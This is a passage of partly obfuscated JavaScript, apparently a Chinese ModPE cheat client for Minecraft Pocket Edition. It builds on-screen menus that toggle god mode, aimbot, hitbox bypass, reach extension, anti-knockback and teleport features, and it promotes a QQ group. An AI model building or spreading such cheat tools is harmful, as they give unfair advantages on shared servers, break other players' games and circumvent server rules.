                var tosLayout1 = new android.widget.LinearLayout(ctx);
                tosLayout.setOrientation(1);
                tosLayout1.setOrientation(1);
                tosScroll.addView(tosLayout);
                tosLayout1.addView(tosScroll);
                tosLayout.setBackground(bg);

                var tosInfo = new Button(ctx);
                tosInfo.setTextSize(15);
                tosInfo.setText("随枫吖简介");
                tosInfo.setTextColor(android.graphics.Color.WHITE);
                tosInfo.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.BLACK));
                tosInfo.getBackground().setAlpha(150);
                tosInfo.setGravity(Gravity.CENTER);
                tosLayout.addView(tosInfo);

                var tosInfo = new Button(ctx);
                tosInfo.setTextSize(15);
                tosInfo.setText("新的UI界面");
                tosInfo.setTextColor(android.graphics.Color.WHITE);
                tosInfo.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.BLACK));
                tosInfo.getBackground().setAlpha(150);
                tosInfo.setGravity(Gravity.CENTER);
                tosLayout.addView(tosInfo);

                var tosInfo = new TextView(ctx);
                tosInfo.setTextSize(15);
                tosInfo.setText("醉仙网络：716069766");
                tosInfo.setTextColor(android.graphics.Color.WHITE);
                tosInfo.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.BLACK));
                tosInfo.getBackground().setAlpha(150);
                tosInfo.setGravity(Gravity.CENTER);
                tosLayout.addView(tosInfo);

                var tosInfo = new TextView(ctx);
                tosInfo.setTextSize(15);
                tosInfo.setText("汉化了所有的指令");
                tosInfo.setTextColor(android.graphics.Color.WHITE);
                tosInfo.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.BLACK));
                tosInfo.getBackground().setAlpha(150);
                tosInfo.setGravity(Gravity.CENTER);
                tosLayout.addView(tosInfo);

                var tosInfo = new TextView(ctx);
                tosInfo.setTextSize(15);
                tosInfo.setText("指令一定要用英文的'!'来书写哦");
                tosInfo.setTextColor(android.graphics.Color.WHITE);
                tosInfo.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.BLACK));
                tosInfo.getBackground().setAlpha(150);
                tosInfo.setGravity(Gravity.CENTER);
                tosLayout.addView(tosInfo);

                var tosInfo = new TextView(ctx);
                tosInfo.setTextSize(15);
                tosInfo.setText("我们的QQ交流群:716069766");
                tosInfo.setTextColor(android.graphics.Color.WHITE);
                tosInfo.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.BLACK));
                tosInfo.getBackground().setAlpha(150);
                tosInfo.setGravity(Gravity.CENTER);
                tosLayout.addView(tosInfo);

                var tosInfo = new TextView(ctx);
                tosInfo.setTextSize(15);
                tosInfo.setText("欢迎您的使用-随枫吖");
                tosInfo.setTextColor(android.graphics.Color.WHITE);
                tosInfo.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.BLACK));
                tosInfo.getBackground().setAlpha(150);
                tosInfo.setGravity(Gravity.CENTER);
                tosLayout.addView(tosInfo);

                var yesBtn = new android.widget.Button(ctx);
                yesBtn.setText("确定");
                yesBtn.setTextColor(android.graphics.Color.RED);
                yesBtn.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.BLACK));
                yesBtn.getBackground().setAlpha(150);
                yesBtn.setTextSize(15);
                yesBtn.setGravity(android.view.Gravity.CENTER);
                yesBtn.setOnClickListener(new android.view.View.OnClickListener({
                    onClick: function(viewarg) {
                        tos.dismiss();
                    }
                }));
                tosLayout.addView(yesBtn);

                tos = new PopupWindow(tosLayout1, ctx.getWindowManager().getDefaultDisplay().getWidth() / 2, ctx.getWindowManager().getDefaultDisplay().getHeight() / 2);
                tos.setAnimationStyle(android.R.style.Animation_InputMethod);
                tos.setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
                tos.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.CENTER | android.view.Gravity.CENTER, 0, 0);
            } catch (error) {
                print("An error occured: " + error);
            }
        }
    }));
}
showChangeLog();


function dip2px(_0x2bf6x12e) {
    return Math['ceil'](_0x2bf6x12e * ctx['getResources']()['getDisplayMetrics']()['density'])
}

function showMenuBtn() {
    ctx['runOnUiThread'](new Runnable({
        run: function() {
            try {
                var _0x2bf6x130 = new LinearLayout(ctx);
                _0x2bf6x130['setOrientation'](1);
                var _0x2bf6x131 = new TextView(ctx);
                if (stealthss) {
                    _0x2bf6x131['setText'](' ')
                } else {
                    _0x2bf6x131['setText']('随枫吖')
                };
                _0x2bf6x131['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                _0x2bf6x131['setTextSize'](26)
                _0x2bf6x131['setBackground'](bg);
                if (stealthss) {
                    _0x2bf6x131['getBackground']()['setAlpha'](0)
                } else {
                    _0x2bf6x131['getBackground']()['setAlpha'](150)
                };
                _0x2bf6x131['setOnClickListener'](new View.OnClickListener({
                    onClick: function(_0x2bf6x132) {
                        mainMenu();
                        exit();
                        if (GUI != null && GUI['isShowing']()) {
                            GUI['dismiss']()
                        }
                    }
                }));
                _0x2bf6x130['addView'](_0x2bf6x131);
                GUI = new PopupWindow(_0x2bf6x130, RelativeLayout['LayoutParams'].WRAP_CONTENT, RelativeLayout['LayoutParams'].WRAP_CONTENT);
                GUI['setBackgroundDrawable'](new ColorDrawable(Color.TRANSPARENT));
                GUI['setAnimationStyle'](android['R']['style'].Animation_Dialog);
                GUI['showAtLocation'](ctx['getWindow']()['getDecorView'](), Gravity['LEFT'] | Gravity['TOP'], 20, 10)
            } catch (err) {
                Toast['makeText'](ctx, 'An error occured: ' + err, 1)['show']()
            }
        }
    }))
}
showMenuBtn();

function showJumpBtn() {
    ctx['runOnUiThread'](new Runnable({
        run: function() {
            try {
                var _0x2bf6x130 = new LinearLayout(ctx);
                _0x2bf6x130['setOrientation'](1);
                var _0x2bf6x134 = new TextView(ctx);
                _0x2bf6x134['setText']('枫');
                _0x2bf6x134['setTextSize'](25);
                _0x2bf6x134['setTextColor'](Color['rgb'](255, 0, 255));
                _0x2bf6x134['setBackground'](jbg);
                _0x2bf6x134['getBackground']()['setAlpha'](150);
                _0x2bf6x134['setOnClickListener'](new View.OnClickListener({
                    onClick: function(_0x2bf6x132) {
                        setVelY(getPlayerEnt(), 0.4)
                    }
                }));
                _0x2bf6x130['addView'](_0x2bf6x134);
                GUIj = new PopupWindow(_0x2bf6x130, RelativeLayout['LayoutParams'].WRAP_CONTENT, RelativeLayout['LayoutParams'].WRAP_CONTENT);
                GUIj['setBackgroundDrawable'](new ColorDrawable(Color.TRANSPARENT));
                GUIj['showAtLocation'](ctx['getWindow']()['getDecorView'](), Gravity['RIGHT'] | Gravity['BOTTOM'], 110, 135)
            } catch (err) {
                Toast['makeText'](ctx, 'An error occured: ' + err, 1)['show']()
            }
        }
    }))
}

function showElevatorBtn() {
    ctx['runOnUiThread'](new Runnable({
        run: function() {
            try {
                var _0x2bf6x130 = new LinearLayout(ctx);
                _0x2bf6x130['setOrientation'](1);
                var _0x2bf6x136 = new Button(ctx);
                _0x2bf6x136['setText']('向上');
                _0x2bf6x136['setTextColor'](Color['rgb'](255, 0, 255));
                _0x2bf6x136['setBackground'](theme);
                _0x2bf6x136['setPadding'](10, 10, 10, 10);
                _0x2bf6x136['getBackground']()['setAlpha'](150);
                _0x2bf6x136['setOnClickListener'](new View.OnClickListener({
                    onClick: function(_0x2bf6x132) {
                        Entity['setPositionRelative'](getPlayerEnt(), 0, +2.53, 0)
                    }
                }));
                _0x2bf6x130['addView'](_0x2bf6x136);
                var _0x2bf6x137 = new Button(ctx);
                _0x2bf6x137['setText']('向下');
                _0x2bf6x137['setTextColor'](Color['rgb'](255, 0, 255));
                _0x2bf6x137['setBackground'](theme);
                _0x2bf6x137['setPadding'](10, 10, 10, 10);
                _0x2bf6x137['getBackground']()['setAlpha'](150);
                _0x2bf6x137['setOnClickListener'](new View.OnClickListener({
                    onClick: function(_0x2bf6x132) {
                        Entity['setPosition'](getPlayerEnt(), getPlayerX(), getPlayerY() - 1.01, getPlayerZ())
                    }
                }));
                _0x2bf6x130['addView'](_0x2bf6x137);
                GUIe = new PopupWindow(_0x2bf6x130, RelativeLayout['LayoutParams'].WRAP_CONTENT, RelativeLayout['LayoutParams'].WRAP_CONTENT);
                GUIe['setBackgroundDrawable'](new ColorDrawable(Color.TRANSPARENT));
                GUIe['showAtLocation'](ctx['getWindow']()['getDecorView'](), Gravity['RIGHT'] | Gravity['CENTER'], 0, 0)
            } catch (err) {
                Toast['makeText'](ctx, 'An error occured: ' + err, 1)['show']()
            }
        }
    }))
}

function showEscapeBtn() {
    ctx['runOnUiThread'](new Runnable({
        run: function() {
            try {
                var _0x2bf6x130 = new LinearLayout(ctx);
                _0x2bf6x130['setOrientation'](1);
                var _0x2bf6x139 = new Button(ctx);
                _0x2bf6x139['setText']('闪现');
                _0x2bf6x139['setTextColor'](Color['rgb'](255, 0, 255));
                _0x2bf6x139['setBackground'](theme);
                _0x2bf6x139['getBackground']()['setAlpha'](150);
                _0x2bf6x139['setOnClickListener'](new View.OnClickListener({
                    onClick: function(_0x2bf6x132) {
                        var _0x2bf6x13a = [0, 0, 0];
                        toDirectionalVector(_0x2bf6x13a, (getYaw() + 90) * Math['PI'] / 180, getPitch() * Math['PI'] / 180 * -1);
                        setVelX(getPlayerEnt(), 6 * _0x2bf6x13a[0]);
                        setVelZ(getPlayerEnt(), 6 * _0x2bf6x13a[2])
                    }
                }));
                _0x2bf6x130['addView'](_0x2bf6x139);
                GUIs = new PopupWindow(_0x2bf6x130, RelativeLayout['LayoutParams'].WRAP_CONTENT, RelativeLayout['LayoutParams'].WRAP_CONTENT);
                GUIs['setBackgroundDrawable'](new ColorDrawable(Color.TRANSPARENT));
                GUIs['showAtLocation'](ctx['getWindow']()['getDecorView'](), Gravity['LEFT'] | Gravity['CENTER'], 0, 0)
            } catch (err) {
                Toast['makeText'](ctx, 'An error occured: ' + err, 1)['show']()
            }
        }
    }))
}

function showReachSwitch() {
    ctx['runOnUiThread'](new Runnable({
        run: function() {
            try {
                var _0x2bf6x130 = new LinearLayout(ctx);
                _0x2bf6x130['setOrientation'](1);
                var _0x2bf6x13c = new android['widget'].ToggleButton(ctx);
                _0x2bf6x13c['setText']('长臂猿');
                _0x2bf6x13c['setTextOn']('长臂猿');
                _0x2bf6x13c['setTextOff']('长臂猿');
                _0x2bf6x13c['setChecked'](sreached);
                _0x2bf6x13c['setTextSize'](18);
                _0x2bf6x13c['setBackground'](bg);
                _0x2bf6x13c['getBackground']()['setAlpha'](150);
                _0x2bf6x13c['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                _0x2bf6x13c['setOnClickListener'](new android['view']['View'].OnClickListener({
                    onClick: function(_0x2bf6x132) {
                        if (!sreached) {
                            sreached = true;
                            Level['setGameMode'](1);
                            Player['setCanFly'](false);
                            _0x2bf6x13c['setBackground'](abg)
                        } else {
                            sreached = false;
                            Level['setGameMode'](0);
                            _0x2bf6x13c['setBackground'](bg)
                        };
                        _0x2bf6x13c['setChecked'](sreached)
                    }
                }));
                _0x2bf6x130['addView'](_0x2bf6x13c);
                GUIr = new PopupWindow(_0x2bf6x130, RelativeLayout['LayoutParams'].WRAP_CONTENT, RelativeLayout['LayoutParams'].WRAP_CONTENT);
                GUIr['setBackgroundDrawable'](new ColorDrawable(Color.TRANSPARENT));
                GUIr['showAtLocation'](ctx['getWindow']()['getDecorView'](), Gravity['RIGHT'] | Gravity['TOP'], 100, 0)
            } catch (err) {
                Toast['makeText'](ctx, 'An error occured: ' + err, 1)['show']()
            }
        }
    }))
}

function showAimSwitch() {
    ctx['runOnUiThread'](new Runnable({
        run: function() {
            try {
                var _0x2bf6x130 = new LinearLayout(ctx);
                _0x2bf6x130['setOrientation'](1);
                var _0x2bf6x13e = new android['widget'].ToggleButton(ctx);
                _0x2bf6x13e['setText']('自瞄');
                _0x2bf6x13e['setTextOn']('自瞄');
                _0x2bf6x13e['setTextOff']('自瞄');
                _0x2bf6x13e['setChecked'](saimed);
                _0x2bf6x13e['setTextSize'](18);
                _0x2bf6x13e['setBackground'](bg);
                _0x2bf6x13e['getBackground']()['setAlpha'](150);
                _0x2bf6x13e['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                _0x2bf6x13e['setOnClickListener'](new android['view']['View'].OnClickListener({
                    onClick: function(_0x2bf6x132) {
                        if (!saimed) {
                            saimed = true;
                            aimbotss = true;
                            _0x2bf6x13e['setBackground'](abg)
                        } else {
                            saimed = false;
                            aimbotss = false;
                            _0x2bf6x13e['setBackground'](bg)
                        };
                        _0x2bf6x13e['setChecked'](saimed)
                    }
                }));
                _0x2bf6x130['addView'](_0x2bf6x13e);
                GUIa = new PopupWindow(_0x2bf6x130, RelativeLayout['LayoutParams'].WRAP_CONTENT, RelativeLayout['LayoutParams'].WRAP_CONTENT);
                GUIa['setBackgroundDrawable'](new ColorDrawable(Color.TRANSPARENT));
                GUIa['showAtLocation'](ctx['getWindow']()['getDecorView'](), Gravity['RIGHT'] | Gravity['TOP'], 150 * 3, 0)
            } catch (err) {
                Toast['makeText'](ctx, 'An error occured: ' + err, 1)['show']()
            }
        }
    }))
}

function showF5Btn() {
    ctx['runOnUiThread'](new Runnable({
        run: function() {
            try {
                var _0x2bf6x130 = new LinearLayout(ctx);
                _0x2bf6x130['setOrientation'](1);
                var _0x2bf6x140 = 0;
                var _0x2bf6x141 = new Button(ctx);
                _0x2bf6x141['setText']('切换视角');
                _0x2bf6x141['setTextColor'](Color['rgb'](255, 0, 255));
                _0x2bf6x141['setBackground'](theme);
                _0x2bf6x141['getBackground']()['setAlpha'](150);
                _0x2bf6x141['setOnClickListener'](new View.OnClickListener({
                    onClick: function(_0x2bf6x132) {
                        _0x2bf6x140++;
                        if (_0x2bf6x140 > 2) {
                            _0x2bf6x140 = 0
                        };
                        ModPE['setPlayerViewPerspective'](_0x2bf6x140)
                    }
                }));
                _0x2bf6x130['addView'](_0x2bf6x141);
                GUIv = new PopupWindow(_0x2bf6x130, RelativeLayout['LayoutParams'].WRAP_CONTENT, RelativeLayout['LayoutParams'].WRAP_CONTENT);
                GUIv['setBackgroundDrawable'](new ColorDrawable(Color.TRANSPARENT));
                GUIv['showAtLocation'](ctx['getWindow']()['getDecorView'](), Gravity['LEFT'] | Gravity['BOTTOM'], 0, 0)
            } catch (err) {
                Toast['makeText'](ctx, 'An error occured: ' + err, 1)['show']()
            }
        }
    }))
}

function showZoomSwitch() {
    ctx['runOnUiThread'](new Runnable({
        run: function() {
            try {
                var _0x2bf6x130 = new LinearLayout(ctx);
                _0x2bf6x130['setOrientation'](1);
                var _0x2bf6x143 = new android['widget'].ToggleButton(ctx);
                _0x2bf6x143['setText']('放大');
                _0x2bf6x143['setTextOn']('放大');
                _0x2bf6x143['setTextOff']('放大');
                _0x2bf6x143['setChecked'](zoomed);
                _0x2bf6x143['setTextSize'](18);
                _0x2bf6x143['setBackground'](bg);
                _0x2bf6x143['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                _0x2bf6x143['setOnClickListener'](new android['view']['View'].OnClickListener({
                    onClick: function(_0x2bf6x132) {
                        if (!zoomed) {
                            zoomed = true;
                            ModPE['setFov'](20);
                            _0x2bf6x143['setBackground'](abg)
                        } else {
                            ModPE['resetFov']();
                            zoomed = false;
                            _0x2bf6x143['setBackground'](bg)
                        };
                        _0x2bf6x143['setChecked'](zoomed)
                    }
                }));
                _0x2bf6x130['addView'](_0x2bf6x143);
                GUIz = new PopupWindow(_0x2bf6x130, RelativeLayout['LayoutParams'].WRAP_CONTENT, RelativeLayout['LayoutParams'].WRAP_CONTENT);
                GUIz['setBackgroundDrawable'](new ColorDrawable(Color.TRANSPARENT));
                GUIz['showAtLocation'](ctx['getWindow']()['getDecorView'](), Gravity['LEFT'] | Gravity['TOP'], 3, 100)
            } catch (err) {
                Toast['makeText'](ctx, 'An error occured: ' + err, 1)['show']()
            }
        }
    }))
}

function showRegenSwitch() {
    ctx['runOnUiThread'](new Runnable({
        run: function() {
            try {
                var _0x2bf6x130 = new LinearLayout(ctx);
                _0x2bf6x130['setOrientation'](1);
                var _0x2bf6x145 = new android['widget'].ToggleButton(ctx);
                _0x2bf6x145['setText']('定');
                _0x2bf6x145['setTextOn']('定');
                _0x2bf6x145['setTextOff']('定');
                _0x2bf6x145['setChecked'](sregened);
                _0x2bf6x145['setTextSize'](18);
                _0x2bf6x145['setBackground'](bg);
                _0x2bf6x145['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                _0x2bf6x145['setOnClickListener'](new android['view']['View'].OnClickListener({
                    onClick: function(_0x2bf6x132) {
                        if (!sregened) {
                            sregened = true;
                            sregenss = true;
                            _0x2bf6x145['setBackground'](abg)
                        } else {
                            sregened = false;
                            sregenss = false;
                            _0x2bf6x145['setBackground'](bg);
                            ModPE['setGameSpeed'](20);
                            Entity['setImmobile'](Player['getEntity'](), false)
                        };
                        _0x2bf6x145['setChecked'](sregened)
                    }
                }));
                _0x2bf6x130['addView'](_0x2bf6x145);
                GUIg = new PopupWindow(_0x2bf6x130, RelativeLayout['LayoutParams'].WRAP_CONTENT, RelativeLayout['LayoutParams'].WRAP_CONTENT);
                GUIg['setBackgroundDrawable'](new ColorDrawable(Color.TRANSPARENT));
                GUIg['showAtLocation'](ctx['getWindow']()['getDecorView'](), Gravity['LEFT'] | Gravity['TOP'], 3, 230)
            } catch (err) {
                Toast['makeText'](ctx, 'An error occured: ' + err, 1)['show']()
            }
        }
    }))
}

function mainMenu() {
    ctx['runOnUiThread'](new Runnable({
        run: function() {
            try {
                var _0x2bf6x147 = new LinearLayout(ctx);
                var _0x2bf6x148 = new ScrollView(ctx);
                var _0x2bf6x149 = new LinearLayout(ctx);
                _0x2bf6x147['setOrientation'](1);
                _0x2bf6x147['setBackground'](theme1);
                _0x2bf6x147['getBackground']()['setAlpha'](150);
                _0x2bf6x149['setOrientation'](1);
                _0x2bf6x148['addView'](_0x2bf6x147);
                _0x2bf6x149['addView'](_0x2bf6x148);
                var scrollText = new android.widget.TextView(ctx);

                scrollText.setText("欢迎加入꯭꯭醉꯭仙꯭网꯭络꯭，群聊号码：716069766");

                scrollText.setTextSize(18);
                scrollText.setTextColor(android.graphics.Color.MAGENTA);

                scrollText.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.RED));
                scrollText.getBackground().setAlpha(150);

                scrollText.setEllipsize(android.text.TextUtils.TruncateAt.MARQUEE);

                scrollText.setMarqueeRepeatLimit(-1);

                scrollText.setSingleLine();

                scrollText.setHorizontallyScrolling(true);

                scrollText.setSelected(true);

                _0x2bf6x147['addView'](scrollText);
                var _0x2bf6x14a = new TextView(ctx);
                _0x2bf6x14a['setTextSize'](20);
                _0x2bf6x14a['setText'](NAME + ' ' + VERSION);
                _0x2bf6x14a['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                _0x2bf6x14a['setGravity'](Gravity.CENTER);
                _0x2bf6x147['addView'](_0x2bf6x14a);
                var _0x2bf6x14b = new TextView(ctx);
                _0x2bf6x14b['setTextSize'](15);
                _0x2bf6x14b['setText']('枫枫 喜欢你 版本' + MODULES);
                _0x2bf6x14b['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                _0x2bf6x14b['setGravity'](Gravity.CENTER);
                _0x2bf6x147['addView'](_0x2bf6x14b);
                var _0x2bf6x14c = new TextView(ctx);
                _0x2bf6x14c['setText']('战斗');
                _0x2bf6x14c['setTextColor'](Color['rgb'](255, 0, 255));
                _0x2bf6x14c['setTextSize'](24);
                _0x2bf6x14c['setBackground'](theme);
                _0x2bf6x14c['getBackground']()['setAlpha'](100);
                _0x2bf6x14c['setGravity'](Gravity.CENTER);
                _0x2bf6x14c['setOnClickListener'](new View.OnClickListener({
                    onClick: function(_0x2bf6x132) {
                        _0x2bf6x14d();
                        exitcombat();
                        if (menu != null && menu['isShowing']()) {
                            menu['dismiss']()
                        };
                        if (GUI != null && GUI['isShowing']()) {
                            GUI['dismiss']()
                        };
                        exitUI['dismiss']()
                    }
                }));
                _0x2bf6x147['addView'](_0x2bf6x14c);

                function _0x2bf6x14d() {
                    ctx['runOnUiThread'](new Runnable({
                        run: function() {
                            try {
                                var _0x2bf6x147 = new LinearLayout(ctx);
                                var _0x2bf6x148 = new ScrollView(ctx);
                                var _0x2bf6x149 = new LinearLayout(ctx);
                                _0x2bf6x147['setOrientation'](1);
                                _0x2bf6x147['setBackground'](theme);
                                _0x2bf6x147['getBackground']()['setAlpha'](120);
                                _0x2bf6x149['setOrientation'](1);
                                _0x2bf6x148['addView'](_0x2bf6x147);
                                _0x2bf6x149['addView'](_0x2bf6x148);
                                var _0x2bf6x14e = new TextView(ctx);
                                _0x2bf6x14e['setTextSize'](20);
                                _0x2bf6x14e['setText']('-| 战斗 |-');
                                _0x2bf6x14e['setTextColor'](android['graphics']['Color'].MAGENTA);
                                _0x2bf6x14e['setBackgroundDrawable'](new ColorDrawable(Color.BLACK));
                                _0x2bf6x14e['getBackground']()['setAlpha'](120);
                                _0x2bf6x14e['setGravity'](Gravity.CENTER);
                                _0x2bf6x147['addView'](_0x2bf6x14e);

                                var godmode = new Switch(ctx);
                                godmode['setText']('上帝模式');
                                godmode['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                godmode['setPadding'](10, 3, 3, 3);
                                godmode['setTextSize'](15);
                                godmode['setBackground'](module);
                                godmode['getBackground']()['setAlpha'](120);
                                godmode['setChecked'](godmodeed);
                                godmode['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!godmodeed) {
                                            godmodes = true;
                                            godmodeed = true
                                        } else {
                                            godmodes = false;
                                            godmodeed = false
                                        };
                                        godmode['setChecked'](godmodeed)
                                    }
                                }));
                                _0x2bf6x147['addView'](godmode);

                                var bypasshitbox = new Switch(ctx);
                                bypasshitbox['setText']('旁路碰撞箱');
                                bypasshitbox['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                bypasshitbox['setPadding'](10, 3, 3, 3);
                                bypasshitbox['setTextSize'](15);
                                bypasshitbox['setBackground'](module);
                                bypasshitbox['getBackground']()['setAlpha'](120);
                                bypasshitbox['setChecked'](bypasshitboxed);
                                bypasshitbox['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!bypasshitboxed) {
                                            bypasshitboxs = true;
                                            bypasshitboxed = true;
                                            bypasshitbox['setBackground'](bg);
                                        } else {
                                            bypasshitboxs = false;
                                            bypasshitboxed = false
                                            bypasshitbox['setBackground'](module);
                                        };
                                        bypasshitbox['setChecked'](bypasshitboxed)
                                    }
                                }));
                                _0x2bf6x147['addView'](bypasshitbox);

                                var hitbox = new Switch(ctx);
                                hitbox['setText']('命中');
                                hitbox['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                hitbox['setPadding'](10, 3, 3, 3);
                                hitbox['setTextSize'](15);
                                hitbox['setBackground'](module);
                                hitbox['getBackground']()['setAlpha'](120);
                                hitbox['setChecked'](hitboxed);
                                hitbox['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!hitboxed) {
                                            hitboxs = true;
                                            hitboxed = true;
                                            hitbox['setBackground'](bg);
                                        } else {
                                            hitboxs = false;
                                            hitboxed = false
                                            hitbox['setBackground'](module);
                                        };
                                        hitbox['setChecked'](hitboxed)
                                    }
                                }));
                                _0x2bf6x147['addView'](hitbox);

                                var aimbots = new Switch(ctx);
                                aimbots['setText']('自瞄');
                                aimbots['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                aimbots['setPadding'](10, 3, 3, 3);
                                aimbots['setTextSize'](15);
                                aimbots['setBackground'](module);
                                aimbots['getBackground']()['setAlpha'](120);
                                aimbots['setChecked'](aimboted);
                                aimbots['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!aimboted) {
                                            aimbotss = true;
                                            aimboted = true;
                                            aimbots['setBackground'](bg);
                                        } else {
                                            aimbotss = false;
                                            aimboted = false
                                            aimbots['setBackground'](module);
                                        };
                                        aimbots['setChecked'](aimboted)
                                    }
                                }));
                                _0x2bf6x147['addView'](aimbots);
                                var switchaims = new Switch(ctx);
                                switchaims['setText']('自瞄');
                                switchaims['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                switchaims['setPadding'](10, 3, 3, 3);
                                switchaims['setTextSize'](15);
                                switchaims['setBackground'](module);
                                switchaims['getBackground']()['setAlpha'](120);
                                switchaims['setChecked'](switchaimed);
                                switchaims['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!switchaimed) {
                                            showAimSwitch();
                                            switchaimed = true
                                            switchaims['setBackground'](bg);
                                        } else {
                                            if (GUIa != null && GUIa['isShowing']()) {
                                                GUIa['dismiss']()
                                            };
                                            switchaimed = false;
                                            aimbotss = false;
                                            saimed = false
                                            switchaims['setBackground'](module);
                                        };
                                        switchaims['setChecked'](switchaimed)
                                    }
                                }));
                                _0x2bf6x147['addView'](switchaims);
                                var aimassists = new Switch(ctx);
                                aimassists['setText']('生物自瞄');
                                aimassists['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                aimassists['setPadding'](10, 3, 3, 3);
                                aimassists['setTextSize'](15);
                                aimassists['setBackground'](module);
                                aimassists['getBackground']()['setAlpha'](120);
                                aimassists['setChecked'](aimassisted);
                                aimassists['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!aimassisted) {
                                            aimassistss = true;
                                            aimassisted = true
                                            fctoast('必须附近有生物才行哦')
                                            aimassists['setBackground'](bg);
                                        } else {
                                            aimassistss = false;
                                            aimassisted = false
                                            aimassists['setBackground'](module);
                                        };
                                        aimassists['setChecked'](aimassisted)
                                    }
                                }));
                                _0x2bf6x147['addView'](aimassists);
                                var reachs = new Switch(ctx);
                                reachs['setText']('攻击传送');
                                reachs['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                reachs['setPadding'](10, 3, 3, 3);
                                reachs['setTextSize'](15);
                                reachs['setBackground'](module);
                                reachs['getBackground']()['setAlpha'](120);
                                reachs['setChecked'](reached);
                                reachs['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!reached) {
                                            reachss = true;
                                            reached = true
                                            reachs['setBackground'](bg);
                                        } else {
                                            reachss = false;
                                            reached = false;
                                            Level['setGameMode'](0)
                                            reachs['setBackground'](module);
                                        };
                                        reachs['setChecked'](reached)
                                    }
                                }));
                                _0x2bf6x147['addView'](reachs);
                                var sidereachs = new Switch(ctx);
                                sidereachs['setText']('画面缩放');
                                sidereachs['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                sidereachs['setPadding'](10, 3, 3, 3);
                                sidereachs['setTextSize'](15);
                                sidereachs['setBackground'](module);
                                sidereachs['getBackground']()['setAlpha'](120);
                                sidereachs['setChecked'](sidereached);
                                sidereachs['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!sidereached) {
                                            ModPE['setFov'](115);
                                            sidereached = true;
                                            sidereachs['setBackground'](bg);
                                        } else {
                                            ModPE['resetFov']();
                                            sidereached = false;
                                            Level['setGameMode'](0)
                                            sidereachs['setBackground'](module);
                                        };
                                        sidereachs['setChecked'](sidereached)
                                    }
                                }));
                                _0x2bf6x147['addView'](sidereachs);
                                var switchreachs = new Switch(ctx);
                                switchreachs['setText']('增加攻击距离');
                                switchreachs['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                switchreachs['setPadding'](10, 3, 3, 3);
                                switchreachs['setTextSize'](15);
                                switchreachs['setBackground'](module);
                                switchreachs['getBackground']()['setAlpha'](120);
                                switchreachs['setChecked'](switchreached);
                                switchreachs['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!switchreached) {
                                            showReachSwitch();
                                            switchreached = true
                                            fctoast('随枫吖:由于相关原因，真正的长臂猿是reach，而不是hitbox，他是通过切换模式来改变距离的，所有服务器可能无效')
                                            switchreachs['setBackground'](bg);
                                        } else {
                                            if (GUIr != null && GUIr['isShowing']()) {
                                                GUIr['dismiss']()
                                            };
                                            switchreached = false;
                                            sreached = false
                                            switchreachs['setBackground'](module);
                                        };
                                        switchreachs['setChecked'](switchreached)
                                    }
                                }));
                                _0x2bf6x147['addView'](switchreachs);
                                var antikbs = new Switch(ctx);
                                antikbs['setText']('反速度-无击退');
                                antikbs['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                antikbs['setPadding'](10, 3, 3, 3);
                                antikbs['setTextSize'](15);
                                antikbs['setBackground'](module);
                                antikbs['getBackground']()['setAlpha'](120);
                                antikbs['setChecked'](antikbed);
                                antikbs['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!antikbed) {
                                            antikbss = true;
                                            antikbed = true
                                            antikbs['setBackground'](bg);
                                        } else {
                                            antikbss = false;
                                            antikbed = false
                                            antikbs['setBackground'](module);
                                        };
                                        antikbs['setChecked'](antikbed)
                                    }
                                }));
                                _0x2bf6x147['addView'](antikbs);
                                var grapples = new Switch(ctx);
                                grapples['setText']('瞬移光环');
                                grapples['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                grapples['setPadding'](10, 3, 3, 3);
